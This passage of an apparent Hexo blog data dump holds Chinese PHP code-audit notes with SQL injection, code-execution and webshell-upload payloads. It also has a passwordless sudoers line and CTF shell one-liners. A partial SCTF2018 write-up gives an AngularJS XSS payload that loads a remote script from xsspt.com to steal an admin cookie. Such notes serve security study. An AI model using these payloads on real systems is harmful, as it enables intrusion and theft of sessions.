href=\"#查询语句缺少单引号\" class=\"headerlink\" title=\"查询语句缺少单引号\"></a>查询语句缺少单引号</h3><pre><code class=\"php\">&quot;Select * from table where id=$id&quot; # 有注入\n&quot;Select * from table where id=&quot;.$id.&quot; limit 1&quot; # 有注入\n&quot;Select * from table where id=&#39;$id&#39;&quot; # 无注入\n&quot;Select * from table where id=&#39;&quot;.$id.&quot;&#39; limit 1&quot; # 无注入\n</code></pre>\n<h2 id=\"宽字符注入\"><a href=\"#宽字符注入\" class=\"headerlink\" title=\"宽字符注入\"></a>宽字符注入</h2><p>原理<br>常见转码函数：<br>iconv()<br>mb_convert_encoding()<br>addslashes<br>防御：<br>用mysql_real_escape_string</p>\n<pre><code class=\"php\">## ?username=tom&amp;password=1%df&#39; or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(&quot;SET NAMES gbk&quot;);\n$query = &quot;select * from user where uname=&#39;&quot;.$uname.&quot;&#39; and pwd=&#39;&quot;.$pwd.&quot;&#39;&quot;;\n</code></pre>\n<h2 id=\"跳转无退出\"><a href=\"#跳转无退出\" class=\"headerlink\" title=\"跳转无退出\"></a>跳转无退出</h2><p>原理:<br>没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。</p>\n<pre><code class=\"php\">## 1\n$this-&gt;myclass-&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&#39;.site_url().&#39;&quot;;&#39;);\n## 2\nheader(&quot;location: ../index.php&quot;);\n</code></pre>\n<h2 id=\"二次编码注入\"><a href=\"#二次编码注入\" class=\"headerlink\" title=\"二次编码注入\"></a>二次编码注入</h2><p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。<br>如%2527，两次urldecode会最后变成’</p>\n<pre><code>base64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n</code></pre><h2 id=\"前端可控变量填充导致XSS\"><a href=\"#前端可控变量填充导致XSS\" class=\"headerlink\" title=\"前端可控变量填充导致XSS\"></a>前端可控变量填充导致XSS</h2><p>当html里的链接是变量时，易出现XSS。</p>\n<pre><code class=\"html\">=\n</code></pre>\n<h2 id=\"命令执行函数\"><a href=\"#命令执行函数\" class=\"headerlink\" title=\"命令执行函数\"></a>命令执行函数</h2><pre><code class=\"php\">system()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = &quot;phpinfo&quot;\npopen(&#39;whoami &gt;&gt;D: /2.txt&#39;, &#39;r&#39;); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n</code></pre>\n<p>防范方法：<br>使用自定义函数或函数库来替代外部命令的功能<br>使用escapeshellarg 函数来处理命令参数<br>使用safe_mode_exec_dir 指定可执行文件的路径</p>\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function构造了一个return后面的语句为一个函数。</p>\n<pre><code class=\"php\">#?sort_by=&quot;]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[&quot;&quot;]);}phpinfo();/*&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]);\n#前面闭合，然后把后面的全部注释掉了。\n&lt;?php\n$sort_by=$_GET[&#39;sort_by&#39;];\n$sorter=&#39;strnatcasecmp&#39;;\n$databases=array(&#39;test&#39;,&#39;test&#39;);\n$sort_function = &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;;\nusort($databases, create_function(&#39;$a, $b&#39;, $sort_function));\n</code></pre>\n<h3 id=\"mb-ereg-replace-的-e模式\"><a href=\"#mb-ereg-replace-的-e模式\" class=\"headerlink\" title=\"mb_ereg_replace()的/e模式\"></a>mb_ereg_replace()的/e模式</h3><p>原理</p>\n<pre><code>mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= &quot;msr&quot;  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n</code></pre><h3 id=\"preg-replace-e模式执行命令\"><a href=\"#preg-replace-e模式执行命令\" class=\"headerlink\" title=\"preg_replace /e模式执行命令\"></a>preg_replace /e模式执行命令</h3><pre><code class=\"php\"># ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(&quot;/\\[(.*)]/e&quot;,&#39;\\\\1&#39;,$_GET[&#39;str&#39;]);\n</code></pre>\n<h2 id=\"动态函数执行\"><a href=\"#动态函数执行\" class=\"headerlink\" title=\"动态函数执行\"></a>动态函数执行</h2><pre><code class=\"php\">call_user_func\ncall_user_func_array\n</code></pre>\n<pre><code class=\"php\"># ?a=assert\ncall_user_func($_GET[&#39;a&#39;],$b);\n</code></pre>\n<h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><pre><code class=\"php\">assert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n</code></pre>\n<h3 id=\"eval-和assert-代码执行\"><a href=\"#eval-和assert-代码执行\" class=\"headerlink\" title=\"eval()和assert()代码执行\"></a>eval()和assert()代码执行</h3><p>当assert()的参数为字符串时 可执行PHP代码。<br>区别：assert可以不加;，eval不可以不加;。</p>\n<pre><code class=\"php\">eval(&quot; phpinfo(); &quot;);【√】 eval(&quot; phpinfo() &quot;);【X】\nassert(&quot; phpinfo(); &quot;);【√】 assert(&quot; phpinfo() &quot;);【√】\n</code></pre>\n<h2 id=\"优先级绕过\"><a href=\"#优先级绕过\" class=\"headerlink\" title=\"优先级绕过\"></a>优先级绕过</h2><p>原理：<br>如果运算符优先级相同，那运算符的结合方向决定了该如何运算<br><a href=\"http://php.net/manual/zh/language.operators.precedence.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/language.operators.precedence.php</a></p>\n<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>\n<pre><code class=\"php\"># ($test = true) and false; $test2 = (true &amp;&amp; false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true &amp;&amp; false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(&quot;123&quot;) and is_numeric(&quot;anything false&quot;); var_dump($test3); //bool(true)\n</code></pre>\n<h2 id=\"getimagesize图片判断绕过\"><a href=\"#getimagesize图片判断绕过\" class=\"headerlink\" title=\"getimagesize图片判断绕过\"></a>getimagesize图片判断绕过</h2><p>原理：<br>当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。<br>只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>\n<p>生成小马图的方法：</p>\n<pre><code class=\"bash\">cat image.png webshell.php &gt; image.php\n</code></pre>\n<pre><code class=\"php\">## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request-&gt;getFiles();\n# 2\nif(getimagesize($files[&#39;users&#39;][&#39;photo&#39;][&#39;tmp_name&#39;]))\n        {\n          move_uploaded_file($files[&#39;users&#39;][&#39;photo&#39;][&#39;tmp_name&#39;], $filename);\n# 3\n$filesize = @getimagesize(&#39;/path/to/image.png&#39;);\nif ($filesize) {\n    do_upload();\n}\n</code></pre>\n<h2 id=\"lt-变-，windows-findfirstfile利用\"><a href=\"#lt-变-，windows-findfirstfile利用\" class=\"headerlink\" title=\"&lt;变*，windows findfirstfile利用\"></a>&lt;变*，windows findfirstfile利用</h2><p>原理：<br>Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。<br>执行过程中，字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。<br>所以：</p>\n<ol>\n<li>“&gt;””&gt;&gt;”可代替一个字符,”&lt;”可以代替后缀多个字符，”&lt;&lt;”可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>\n<li>“ 可以代替.</li>\n<li>文件名第一个字符是”.”的话，读取时可以忽略之</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>NO</th>\n<th>Status</th>\n<th>Function</th>\n<th>Type of operation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1.</td>\n<td>OK</td>\n<td>include()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>2.</td>\n<td>OK</td>\n<td>include_once()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>3.</td>\n<td>OK</td>\n<td>require()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>4.</td>\n<td>OK</td>\n<td>require_once()</td>\n<td>Include file</td>\n</tr>\n<tr>\n<td>5.</td>\n<td>OK</td>\n<td>fopen()</td>\n<td>Openfile</td>\n</tr>\n<tr>\n<td>6.</td>\n<td>OK</td>\n<td>ZipArchive::open()</td>\n<td>Archive file</td>\n</tr>\n<tr>\n<td>7.</td>\n<td>OK</td>\n<td>copy()</td>\n<td>Copyfile</td>\n</tr>\n<tr>\n<td>8.</td>\n<td>OK</td>\n<td>file_get_contents()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>9.</td>\n<td>OK</td>\n<td>parse_ini_file()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>10.</td>\n<td>OK</td>\n<td>readfile()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>11.</td>\n<td>OK</td>\n<td>file_put_contents()</td>\n<td>Write file</td>\n</tr>\n<tr>\n<td>12.</td>\n<td>OK</td>\n<td>mkdir()</td>\n<td>New directory creation</td>\n</tr>\n<tr>\n<td>13.</td>\n<td>OK</td>\n<td>tempnam()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>14.</td>\n<td>OK</td>\n<td>touch()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>15.</td>\n<td>OK</td>\n<td>move_uploaded_file()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>16.</td>\n<td>OK</td>\n<td>opendiit)</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>17.</td>\n<td>OK</td>\n<td>readdir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>18.</td>\n<td>OK</td>\n<td>rewinddir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>19.</td>\n<td>OK</td>\n<td>closedir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>20.</td>\n<td>FAIL</td>\n<td>rename()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>21.</td>\n<td>FAIL</td>\n<td>unlink()</td>\n<td>Delete file</td>\n</tr>\n<tr>\n<td>22.</td>\n<td>FAIL</td>\n<td>rmdir())</td>\n<td>Directory operation</td>\n</tr>\n</tbody>\n</table>\n<pre><code class=\"php\">## ?file=1&lt;\n## ?file=1&gt;\n## ?file=1&quot;txt\n文件名为1.txt\n\n## ?file=1234.tx&gt;\n## ?file=1234.&lt;\n## ?file=1&lt;&lt;\n## ?file=1&lt;&lt;&quot;&gt;\n## ?file=123&gt;&quot;&gt;\n## ?file=&gt;&gt;&gt;4&quot;&gt;\n## ?file=&lt;&lt;4&quot;&gt;\n文件名为1234.txt\n\ninclude(&#39;shell&lt;&#39;);  \ninclude(&#39;shell&lt;&lt;&#39;);\ninclude(&#39;shell.p&gt;p&#39;); \ninclude(&#39;shell&quot;php&#39;);\nfopen(&#39;.htacess&#39;);  //==&gt;fopen(&quot;htacess&#39;);\nfile_get_contents(&#39;C:boot.ini&#39;); //==&gt;  file_get_contents (&#39;C:/boot.ini&#39;);\nfile_get_contents(&#39;C:/tmp/con.jpg&#39;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents(&#39;C:/tmp/con.jpg&#39;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n</code></pre>\n<h2 id=\"处理value没有处理key\"><a href=\"#处理value没有处理key\" class=\"headerlink\" title=\"处理value没有处理key\"></a>处理value没有处理key</h2><p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>\n<h2 id=\"用来目录遍历的特别函数\"><a href=\"#用来目录遍历的特别函数\" class=\"headerlink\" title=\"用来目录遍历的特别函数\"></a>用来目录遍历的特别函数</h2><p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a><br>lstat 函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a><br>stream_resolve_include_path函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>\n<h2 id=\"绕过GD库图片渲染\"><a href=\"#绕过GD库图片渲染\" class=\"headerlink\" title=\"绕过GD库图片渲染\"></a>绕过GD库图片渲染</h2><p><a href=\"file/PHP代码审计_jpg_payload.zip\">jpg_payload.zip</a></p>\n<p>jpg_name.jpg是待GD处理的图片</p>\n<pre><code>php jpg_payload.php &lt;jpg_name.jpg&gt;\n</code></pre><p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>\n<pre><code class=\"php\">&lt;?php\n    imagecreatefromjpeg(&#39;xxxx.jpg&#39;);\n?&gt;\n</code></pre>\n<h2 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h2><pre><code class=\"php\">if(!empty($_GET[&#39;phpsessid&#39;])) session_id($_GET[&#39;phpsessid&#39;]);//通过GET方法传递sessionid\n</code></pre>\n<p>通过get方法来设置session。所以可以通过CSRF：</p>\n<p><a href=\"http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123\" target=\"_blank\" rel=\"noopener\">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>\n<p>管理员点了我们就能使用此session进后台了。</p>\n<h2 id=\"end方法获取元素的问题\"><a href=\"#end方法获取元素的问题\" class=\"headerlink\" title=\"end方法获取元素的问题\"></a>end方法获取元素的问题</h2><pre><code class=\"php\">$file = array(1 =&gt; &#39;png&#39;, 0 =&gt; &#39;php&#39;);\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n</code></pre>\n<p>两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。</p>\n<h2 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h2><p>PHP代码审计分段讲解</p>\n<p><a href=\"https://github.com/bowu678/php_bugs\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs</a></p>\n<p><a href=\"https://github.com/jiangsir404/Audit-Learning\" target=\"_blank\" rel=\"noopener\">https://github.com/jiangsir404/Audit-Learning</a></p>\n<p><a href=\"https://read.douban.com/reader/ebook/16642056/\" target=\"_blank\" rel=\"noopener\">https://read.douban.com/reader/ebook/16642056/</a></p>"},{"title":"普通用户免密码切换到root","date":"2018-05-29T06:44:48.000Z","_content":"\n1. sudo vim /etc/sudoers\n\n2. 添加一行:\n\n   > tiandiwuji  ALL=(ALL)       NOPASSWD: ALL\n\n","source":"_posts/普通用户免密码切换到root.md","raw":"---\ntitle: 普通用户免密码切换到root\ndate: 2018-05-29 14:44:48\ntags:\n---\n\n1. sudo vim /etc/sudoers\n\n2. 添加一行:\n\n   > tiandiwuji  ALL=(ALL)       NOPASSWD: ALL\n\n","slug":"普通用户免密码切换到root","published":1,"updated":"2018-05-29T06:45:39.244Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jq7001cly4jhepl2x95","content":"<ol>\n<li><p>sudo vim /etc/sudoers</p>\n</li>\n<li><p>添加一行:</p>\n<blockquote>\n<p>tiandiwuji  ALL=(ALL)       NOPASSWD: ALL</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>sudo vim /etc/sudoers</p>\n</li>\n<li><p>添加一行:</p>\n<blockquote>\n<p>tiandiwuji  ALL=(ALL)       NOPASSWD: ALL</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"简单的命令（shell+python）","date":"2018-04-24T02:27:37.000Z","_content":"\n1. 统计文件中每个字符串的长度\n\n   > grep -o . file.txt | sort | uniq -c | sort -rn\n\n2. Python将16进制字符串转化为ascii码\n\n   > a = \"456e\"\n   >\n   > ''.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n3. Python将16进制字符串转为2进制字符串\n\n   > a = \"456e\"\n   >\n   > ''.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n4. Python二进制字符串转16进制字符串\n\n   > str = \"0100010101101110\"\n   >\n   > ''.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])\n\n5. hexdump使用\n\n   > hexdump [filename]  以16进制查看文件\n   >\n   > hexdumlp -C [filename] 以16进制查看文件同时显示ascii码\n\n6. 7z使用\n\n   > 7z x [压缩包]\n\n7. binwalk使用\n\n   > binwalk [filename] 查看文件信息\n   >\n   > binwalk -e [filename]  提取文件\n\n8. strings使用\n\n   > strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串\n\n9. base64使用\n\n   > echo [base64字符串] | base64 -d              base64解密\n   >\n   > echo [字符串] | base64                              base64加密\n\n10. debin,ubuntu删除所有带 rc 标记的dpkg包\n\n   > dpkg -l | grep ^rc | cut -d' ' -f3 | sudo xargs dpkg --purge\n\n11. 批量计算文件夹中所有文件md5值\n\n    > md5sum *\n\n12. LSB检查\n\n    > ```python\n    > >>> import Image\n    > >>> a=Image.open('zxczxc.png')\n    > >>> a.point(lambda i: 255 if i&1 else 0).show()\n    > ```\n\n13. 查看文件夹下边的某个字符串\n\n> grep -rn -A10 -B5 \"php_string_shuffle\" ./\n>\n> grep -rn -A10 -B5 \"php_string_shuffle\" -l ./          只列出文件名\n\n14. 监控目录变化\n\n    > watch -n2 ls -l /proc/11631/fd/\n\n15. dd命令使用\n\n    >  dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1\n\n16. shell文件去重\n\n    > sort filename | uniq\n\n17. socat启动一道pwn题目\n\n    > socat tcp-l:8080,fork exec:./note,reuseaddr","source":"_posts/简单的一句话.md","raw":"---\ntitle: 简单的命令（shell+python）\ndate: 2018-04-24 10:27:37\ntags:\n---\n\n1. 统计文件中每个字符串的长度\n\n   > grep -o . file.txt | sort | uniq -c | sort -rn\n\n2. Python将16进制字符串转化为ascii码\n\n   > a = \"456e\"\n   >\n   > ''.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n3. Python将16进制字符串转为2进制字符串\n\n   > a = \"456e\"\n   >\n   > ''.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])\n\n4. Python二进制字符串转16进制字符串\n\n   > str = \"0100010101101110\"\n   >\n   > ''.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])\n\n5. hexdump使用\n\n   > hexdump [filename]  以16进制查看文件\n   >\n   > hexdumlp -C [filename] 以16进制查看文件同时显示ascii码\n\n6. 7z使用\n\n   > 7z x [压缩包]\n\n7. binwalk使用\n\n   > binwalk [filename] 查看文件信息\n   >\n   > binwalk -e [filename]  提取文件\n\n8. strings使用\n\n   > strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串\n\n9. base64使用\n\n   > echo [base64字符串] | base64 -d              base64解密\n   >\n   > echo [字符串] | base64                              base64加密\n\n10. debin,ubuntu删除所有带 rc 标记的dpkg包\n\n   > dpkg -l | grep ^rc | cut -d' ' -f3 | sudo xargs dpkg --purge\n\n11. 批量计算文件夹中所有文件md5值\n\n    > md5sum *\n\n12. LSB检查\n\n    > ```python\n    > >>> import Image\n    > >>> a=Image.open('zxczxc.png')\n    > >>> a.point(lambda i: 255 if i&1 else 0).show()\n    > ```\n\n13. 查看文件夹下边的某个字符串\n\n> grep -rn -A10 -B5 \"php_string_shuffle\" ./\n>\n> grep -rn -A10 -B5 \"php_string_shuffle\" -l ./          只列出文件名\n\n14. 监控目录变化\n\n    > watch -n2 ls -l /proc/11631/fd/\n\n15. dd命令使用\n\n    >  dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1\n\n16. shell文件去重\n\n    > sort filename | uniq\n\n17. socat启动一道pwn题目\n\n    > socat tcp-l:8080,fork exec:./note,reuseaddr","slug":"简单的一句话","published":1,"updated":"2018-06-09T05:04:47.630Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jq8001ely4jgcpfyphc","content":"<ol>\n<li><p>统计文件中每个字符串的长度</p>\n<blockquote>\n<p>grep -o . file.txt | sort | uniq -c | sort -rn</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转化为ascii码</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转为2进制字符串</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python二进制字符串转16进制字符串</p>\n<blockquote>\n<p>str = “0100010101101110”</p>\n<p>‘’.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])</p>\n</blockquote>\n</li>\n<li><p>hexdump使用</p>\n<blockquote>\n<p>hexdump [filename]  以16进制查看文件</p>\n<p>hexdumlp -C [filename] 以16进制查看文件同时显示ascii码</p>\n</blockquote>\n</li>\n<li><p>7z使用</p>\n<blockquote>\n<p>7z x [压缩包]</p>\n</blockquote>\n</li>\n<li><p>binwalk使用</p>\n<blockquote>\n<p>binwalk [filename] 查看文件信息</p>\n<p>binwalk -e [filename]  提取文件</p>\n</blockquote>\n</li>\n<li><p>strings使用</p>\n<blockquote>\n<p>strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串</p>\n</blockquote>\n</li>\n<li><p>base64使用</p>\n<blockquote>\n<p>echo [base64字符串] | base64 -d              base64解密</p>\n<p>echo [字符串] | base64                              base64加密</p>\n</blockquote>\n</li>\n<li><p>debin,ubuntu删除所有带 rc 标记的dpkg包</p>\n<blockquote>\n<p>dpkg -l | grep ^rc | cut -d’ ‘ -f3 | sudo xargs dpkg –purge</p>\n</blockquote>\n</li>\n<li><p>批量计算文件夹中所有文件md5值</p>\n<blockquote>\n<p>md5sum *</p>\n</blockquote>\n</li>\n<li><p>LSB检查</p>\n<blockquote>\n<pre><code class=\"python\">&gt;&gt;&gt; import Image\n&gt;&gt;&gt; a=Image.open(&#39;zxczxc.png&#39;)\n&gt;&gt;&gt; a.point(lambda i: 255 if i&amp;1 else 0).show()\n</code></pre>\n</blockquote>\n</li>\n<li><p>查看文件夹下边的某个字符串</p>\n</li>\n</ol>\n<blockquote>\n<p>grep -rn -A10 -B5 “php_string_shuffle” ./</p>\n<p>grep -rn -A10 -B5 “php_string_shuffle” -l ./          只列出文件名</p>\n</blockquote>\n<ol>\n<li><p>监控目录变化</p>\n<blockquote>\n<p>watch -n2 ls -l /proc/11631/fd/</p>\n</blockquote>\n</li>\n<li><p>dd命令使用</p>\n<blockquote>\n<p> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</p>\n</blockquote>\n</li>\n<li><p>shell文件去重</p>\n<blockquote>\n<p>sort filename | uniq</p>\n</blockquote>\n</li>\n<li><p>socat启动一道pwn题目</p>\n<blockquote>\n<p>socat tcp-l:8080,fork exec:./note,reuseaddr</p>\n</blockquote>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li><p>统计文件中每个字符串的长度</p>\n<blockquote>\n<p>grep -o . file.txt | sort | uniq -c | sort -rn</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转化为ascii码</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([chr(int(b, 16)) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python将16进制字符串转为2进制字符串</p>\n<blockquote>\n<p>a = “456e”</p>\n<p>‘’.join([(bin(int(b, 16))[2:]).zfill(8) for b in [a[i:i+2] for i in range(0, len(a), 2)]])</p>\n</blockquote>\n</li>\n<li><p>Python二进制字符串转16进制字符串</p>\n<blockquote>\n<p>str = “0100010101101110”</p>\n<p>‘’.join([(hex(int(b, 2))[2:]).zfill(2) for b in [a[i:i+8] for i in range(0, len(a), 8)]])</p>\n</blockquote>\n</li>\n<li><p>hexdump使用</p>\n<blockquote>\n<p>hexdump [filename]  以16进制查看文件</p>\n<p>hexdumlp -C [filename] 以16进制查看文件同时显示ascii码</p>\n</blockquote>\n</li>\n<li><p>7z使用</p>\n<blockquote>\n<p>7z x [压缩包]</p>\n</blockquote>\n</li>\n<li><p>binwalk使用</p>\n<blockquote>\n<p>binwalk [filename] 查看文件信息</p>\n<p>binwalk -e [filename]  提取文件</p>\n</blockquote>\n</li>\n<li><p>strings使用</p>\n<blockquote>\n<p>strings -10 [filename] 从二进制文件或普通文件中查找可打印的字符串，-10  设置显示的最小字符串</p>\n</blockquote>\n</li>\n<li><p>base64使用</p>\n<blockquote>\n<p>echo [base64字符串] | base64 -d              base64解密</p>\n<p>echo [字符串] | base64                              base64加密</p>\n</blockquote>\n</li>\n<li><p>debin,ubuntu删除所有带 rc 标记的dpkg包</p>\n<blockquote>\n<p>dpkg -l | grep ^rc | cut -d’ ‘ -f3 | sudo xargs dpkg –purge</p>\n</blockquote>\n</li>\n<li><p>批量计算文件夹中所有文件md5值</p>\n<blockquote>\n<p>md5sum *</p>\n</blockquote>\n</li>\n<li><p>LSB检查</p>\n<blockquote>\n<pre><code class=\"python\">&gt;&gt;&gt; import Image\n&gt;&gt;&gt; a=Image.open(&#39;zxczxc.png&#39;)\n&gt;&gt;&gt; a.point(lambda i: 255 if i&amp;1 else 0).show()\n</code></pre>\n</blockquote>\n</li>\n<li><p>查看文件夹下边的某个字符串</p>\n</li>\n</ol>\n<blockquote>\n<p>grep -rn -A10 -B5 “php_string_shuffle” ./</p>\n<p>grep -rn -A10 -B5 “php_string_shuffle” -l ./          只列出文件名</p>\n</blockquote>\n<ol>\n<li><p>监控目录变化</p>\n<blockquote>\n<p>watch -n2 ls -l /proc/11631/fd/</p>\n</blockquote>\n</li>\n<li><p>dd命令使用</p>\n<blockquote>\n<p> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</p>\n</blockquote>\n</li>\n<li><p>shell文件去重</p>\n<blockquote>\n<p>sort filename | uniq</p>\n</blockquote>\n</li>\n<li><p>socat启动一道pwn题目</p>\n<blockquote>\n<p>socat tcp-l:8080,fork exec:./note,reuseaddr</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"sctf2018","date":"2018-06-21T01:59:01.000Z","password":123456,"_content":"\n<!--more-->\n\n# 新的建议板\n\n1. 基础payload\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n   ```\n\n2. 打cookie\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n   ```\n\n3. 调用script\n\n   使用\n\n   > $.getScript('https://xsspt.com/HMTzMS')\n\n   > base64一下: `JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==`\n\n4. 这样就可以拿到cookie\n\n   接收到的内容如下:\n\n   ```\n   location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B'a'.constructor.prototype.charAt=[].join;$eval('x=1%7D%20%7D%20%7D;eval(atob(%5C'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C'))//');%7D%7D\n   ```\n\n5. 